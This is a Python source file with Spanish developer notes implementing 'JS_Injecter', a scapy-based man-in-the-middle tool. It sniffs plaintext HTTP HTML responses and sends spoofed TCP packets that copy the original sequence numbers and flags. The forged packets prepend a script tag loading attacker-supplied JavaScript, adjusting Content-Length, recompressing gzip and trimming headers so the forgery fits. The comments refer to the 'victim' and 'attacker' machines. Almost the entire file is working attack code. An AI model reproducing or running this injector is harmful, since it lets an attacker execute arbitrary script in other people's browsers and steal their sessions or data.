#Nuevo acercamiento al problema: inyectar en html

#Parece que cuando la longitud de la load es superior a 1434, la longitud del paquete supera los 1514,
#que parece ser el limite de lo que recibe el ordenador victima. ver por que aumenta el tamaño del paquete
#(posiblemente trailer) y probar en otro pc a ver si el tamaño es diferente

#en mi maquina atacante segun wireshark la longitud del paquete que envio es de 1530, y la original 1516.
#justamente es 14 la longitud del trailer. no parece que sea scapy el que este añadiendo el padding de dos octetos,
#ya que las dos situaciones en las que lo hacen tienen colocadas un print que no salta en ningun momento.

#sin embargo scapy me dice que mi paquete mide 1500 mientras que el paquete real mide 1514.
#es posible que estos 14 sean por la capa Ether, ya que mi paquete con capa Ether tambien mide 1514.

#probar a igualar opciones como ip.id, ip.ttl


import threading
import gzip
from scapy.all import *

from src import packet_utilities


class JS_Injecter(threading.Thread):
    """holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
    jajajaaaaaaaaaaaaaa"""
    def __init__(self, exit_event, file_loc, timeout):
        super().__init__()
        self.exit_event = exit_event
        #self.file_loc = file_loc
        self.timeout = timeout
        self.injected_code = b"<script src=\"" + file_loc.encode("utf-8") + b"\"></script>\n"

        self.handled_packets = []
        
    
    def _get_attribute(self, attribute, load):
        #Returns a string containing the attribute, its value and the \r\n
        first_pos = load.find(attribute.encode())
        if first_pos != -1:
            last_pos = load.find(b"\r\n", first_pos) +2
            data = load[first_pos:last_pos]
            return data
        return b""
    
    
    def _increase_length_attribute(self, load):
        
        first_pos = load.find(b"Content-Length: ")
        if first_pos != -1:
            last_pos = load.find(b"\r\n", first_pos)
            length_all = load[first_pos:last_pos]
            length_n = load[first_pos+16:last_pos]
            #print(length_n)
            new_length = b"Content-Length: " + str(int(length_n)+len(self.injected_code)).encode("utf-8")
            result = load.replace(length_all, new_length, 1)
            return result
        return load
        
        
    def _remove_header_attribute_if_necessary(self, attr_name, load, length_needed):
        if len(load) > length_needed:
            new_load = load
            attr_all = self._get_attribute(attr_name, new_load)
            if not attr_all:
                print("Attribute", attr_name, "not found")
                return load
            
            if len(load) - len(attr_all) > length_needed: #si a pesar de quitarle el atributo sigue siendo muy largo, se lo quito entero
                new_load = new_load.replace(attr_all, b"", 1)
                print("Attribute", attr_name, "removed completely to save", len(attr_all), "bytes.")
            else: #quito la longitud adecuada para llegar al tamaño
                remove = attr_all[-2-(len(load)-length_needed):-2] #la parte del atributo que quito
                
                
                #si la longitud de lo que vamos a quitar es mayor a la longitud de lo que seria
                #el valor del atributo, en vez de dejar el nombre del atributo a medias (ej 'Expir'),
                #mejor dejar el valor del atributo vacio pero con el nombre (ej 'Expires: \r\n')
                #attrl_all:     Expires: ejemplo\r\n    18   
                #attr_name:     Expires                 7   
                #remove:            res: ejemplo        12
                #final:         Expi\r\n                6
                #should be:     Expires: \r\n           11
                
                if len(remove) >= len(attr_all) - len(attr_name+": \n\r"): 
                    remove = attr_all[len(attr_name + ": \n\r")-2:-2]

                    
                new_load = new_load.replace(remove, b"", 1)
                print("Attribute", attr_name, "removed partialy to save", len(remove), "bytes. Original attribute length:", len(attr_all))
            return new_load
        else:
            return load


    def _shorten_load_if_necessary(self, load, length_needed):
        attributes = ["Date", "Expires", "Last-Modified", "Server"]
        
        new_load = load
        for attr in attributes:
            new_load = self._remove_header_attribute_if_necessary(attr, new_load, length_needed)
        
        if len(new_load) > length_needed:
            print("[ERROR] Despite having removed attributes, length was reduced from", len(load), "to", len(new_load), "and not to", length_needed, "(" + str(len(new_load)-length_needed) + " more bytes than intended)")
        
        return new_load
        
    
    def _add_handled_packet(self, packet):
        data = (packet["TCP"].ack, packet["TCP"].seq, packet_utilities.get_checksum(packet, "TCP"))
        if not data in self.handled_packets: #why the hell did i put this
            self.handled_packets.append(data) 
            
    
    def _has_packet_been_handled(self, ack, seq, tcp_checksum):
        result = ((ack,seq,tcp_checksum) in self.handled_packets)
        return result
        
        
    def send_spoofed_packet(self, real_packet):
        
        print("\n")
        
        spoof_load = real_packet.load
        
        spoof_load = self._increase_length_attribute(spoof_load)
        
        spoof_load_s = spoof_load.split(b"\r\n\r\n")
        
        encoding = None
        if b"Content-Encoding: gzip" in spoof_load_s[0]:
            encoding = "gzip"
            print("DETECTED GZIP ENCODING")
            try:
                spoof_load_s[1] = gzip.decompress(spoof_load_s[1])
            except Exception as err:
                print("ERROR DECOMPRESSING:", err)
        
        
        spoof_load_s[1] = self.injected_code + spoof_load_s[1]
    
        if encoding == "gzip":
            spoof_load_s[1] = gzip.compress(spoof_load_s[1])
        
        spoof_load = b"\r\n\r\n".join(spoof_load_s)
        

        ###SPACE1### no le llegan aunque tiene longitud buena
        spoof_load = self._shorten_load_if_necessary(spoof_load, len(real_packet.load))

        
 
        


        
        spoof_packet = IP(src=real_packet["IP"].src, dst=real_packet["IP"].dst, flags=real_packet["IP"].flags, id=real_packet["IP"].id)/ \
                       TCP(sport=real_packet["TCP"].sport, dport=real_packet["TCP"].dport, seq=real_packet["TCP"].seq, 
                       ack=real_packet["TCP"].ack, flags=real_packet["TCP"].flags, window=real_packet["TCP"].window, options=real_packet["TCP"].options)/ \
                       Raw(load=spoof_load)

        print("[BEFORE]:")
        #print(real_packet.load.decode("utf-8","ignore"))
        real_packet.show()
        print("\n[AFTER]:")
        #print(spoof_load.decode("utf-8","ignore"))
        spoof_packet.show2()
        
        print("Spoof load length:", len(spoof_load), "Real load length:", len(real_packet.load))
        if len(spoof_load) > 2000:
            spoof_packet.show()
        # ~ print(len(spoof_packet["IP"]), len(real_packet["IP"]))
        # ~ print(len(spoof_packet["TCP"]), len(real_packet["TCP"]))
        # ~ print(len(spoof_packet["Raw"]), len(real_packet["Raw"]))
        print("Spoof packet length:", len(spoof_packet), "Real packet length:", len(real_packet))
        

        send(spoof_packet)
        self._add_handled_packet(spoof_packet)
        
        
    def handle_packet(self, packet):
        if not self._has_packet_been_handled(packet["TCP"].ack, packet["TCP"].seq, packet["TCP"].chksum):
            #print(packet["TCP"].ack, packet["TCP"].seq, packet["TCP"].chksum, "entered to:", self.handled_packets)
            self.send_spoofed_packet(packet)
            self._add_handled_packet(packet)
            
        
    def run(self):
        print("JS Injecter started.")
        
        sniff(filter="tcp and src port 80", lfilter= lambda x: x.haslayer("TCP") and x.haslayer("Raw") and b"ype: text/html" in x.load,
              prn=self.handle_packet, stopperTimeout=3, stopper=self.exit_event.is_set, 
              timeout=self.timeout, store=False)
        
        print("JS Injecter finished.")
